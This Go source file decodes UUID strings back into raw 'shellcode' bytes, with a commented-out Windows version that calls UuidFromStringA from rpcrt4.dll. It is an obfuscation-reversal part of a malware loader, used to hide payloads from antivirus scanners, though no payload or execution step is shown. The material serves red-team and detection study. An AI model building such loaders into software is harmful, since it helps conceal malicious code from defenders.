package deobfuscation

import (
	"fmt"
	"github.com/google/uuid"
)

// UuidDeobfuscation processes an array of UUID strings, converts them to raw bytes, and returns a buffer.
func UuidDeobfuscation(uuidArray []string) ([]byte, error) {

	var shellcode []byte

	for _, uuidStr := range uuidArray {
		parsedUUID, err := uuid.Parse(uuidStr)
		if err != nil {
			return nil, fmt.Errorf("failed to parse UUID [%s]: %v", uuidStr, err)
		}

		// Extract the bytes from the UUID in reverse order
		bytes := parsedUUID[:]

		// Reconstruct the original order as per the GenerateUuid function logic
		originalOrder := []byte{
			bytes[3], bytes[2], bytes[1], bytes[0], // d, c, b, a
			bytes[5], bytes[4], bytes[7], bytes[6], // f, e, h, g
			bytes[8], bytes[9], bytes[10], bytes[11], // i, j, k, l
			bytes[12], bytes[13], bytes[14], bytes[15], // m, n, o, p
		}

		// Append to the shellcode
		shellcode = append(shellcode, originalOrder...)
	}

	return shellcode, nil
}

/* Windows specific implementation
import (
	"fmt"
	"syscall"
	"unsafe"
)

// UuidFromStringA function type definition (this represents the function in the DLL)
type fnUuidFromStringA func(*byte, *syscall.GUID) uint32

func UuidDeobfuscation(uuidArray []*byte, numberOfElements int, ppDAddress **byte, pDSize *int) bool {
	// Load the DLL and get the procedure address
	rpcrt4 := syscall.MustLoadDLL("rpcrt4.dll")
	procUuidFromStringA := rpcrt4.MustFindProc("UuidFromStringA")
	pUuidFromStringA := procUuidFromStringA.Addr()

	if pUuidFromStringA == 0 {
		fmt.Printf("[!] GetProcAddress Failed With Error: %d\n", syscall.GetLastError())
		return false
	}

	// Calculate the buffer size and allocate memory
	sBuffSize := numberOfElements * 16
	pBuffer := make([]byte, sBuffSize)
	if pBuffer == nil {
		fmt.Printf("[!] Memory Allocation Failed\n")
		return false
	}
	tmpBuffer := pBuffer

	// Convert UUIDs and fill the buffer
	for i := 0; i < numberOfElements; i++ {
		status := syscall.Syscall(
			pUuidFromStringA,
			2,
			uintptr(unsafe.Pointer(uuidArray[i])),
			uintptr(unsafe.Pointer((*syscall.GUID)(unsafe.Pointer(&tmpBuffer[i*16])))),
			0,
		)

		if status != 0 {
			fmt.Printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X\n", string(uuidArray[i]), status)
			return false
		}
	}

	*ppDAddress = &pBuffer[0]
	*pDSize = sBuffSize
	return true
}
*/
